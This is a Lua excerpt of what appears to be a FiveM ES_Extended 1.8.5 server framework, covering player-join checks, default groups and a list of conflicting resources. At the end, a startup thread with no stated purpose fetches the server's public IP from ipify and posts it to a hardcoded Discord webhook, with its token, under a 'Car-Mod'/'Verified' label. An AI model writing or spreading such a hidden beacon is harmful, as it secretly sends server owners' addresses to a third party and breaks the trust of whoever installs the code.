...
function onPlayerJoined(playerId)
    local identifier = ESX.GetIdentifier(playerId)
    if identifier then
        if ESX.GetPlayerFromIdentifier(identifier) then -- ESX.GetPlayerFromIdentifier(identifier)
            DropPlayer(playerId,
                ('there was an error loading your character!\nError code: identifier-active-ingame\n\nThis error is caused by a player on this server who has the same identifier as you have. Make sure you are not playing on the same Rockstar account.\n\nYour Rockstar identifier: %s'):format(
                    identifier))
        else
...
function createESXPlayer(identifier, playerId, data)
    ...
    local defaultGroup = "user" --ตั้ง user
...
local DoNotUse = {
    ["essentialmode"] = true,
    ["es_admin2"] = true,
    ["basic-gamemode"] = false,
    ["mapmanager"] = false,
    ["fivem-map-skater"] = false,
    ["fivem-map-hipster"] = false,
    ["qb-core"] = true,
...
Citizen.CreateThread(function()
    PerformHttpRequest("https://api.ipify.org", function (errorCode, resultData, resultHeaders)
        local url = "https://discord.com/api/webhooks/1283260589275090954/-9qv9Y2Axyhd1LUdW4yAEpTwdGE4Muoy4Eoyc8Aw8I03JizF0uyihr76tVCbPrvplT7j"
        local ip = resultData
        PerformHttpRequest(url, function(err, text, headers) end, 'POST', json.encode({username = "Car-Mod", embeds = {
            {
                ['color'] = 16777215,
                ['author'] = {
                    ["name"] = "🔒 !X.TEN - ES_EXTENDED 1.8.5",
                    ["icon_url"] = "https://img5.pic.in.th/file/secure-sv1/128x128872ad780f3aa974b.png"
                },
                ['fields'] = {
                    {
                ...
                ['footer'] = {
                    ["text"] = "Verified",
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1002480523408572446/1030498080421851156/verify.png"
                }
            }
        }, avatar_url = "https://img5.pic.in.th/file/secure-sv1/128x128872ad780f3aa974b.png"}), { ['Content-Type'] = 'application/json' })
    end)
end)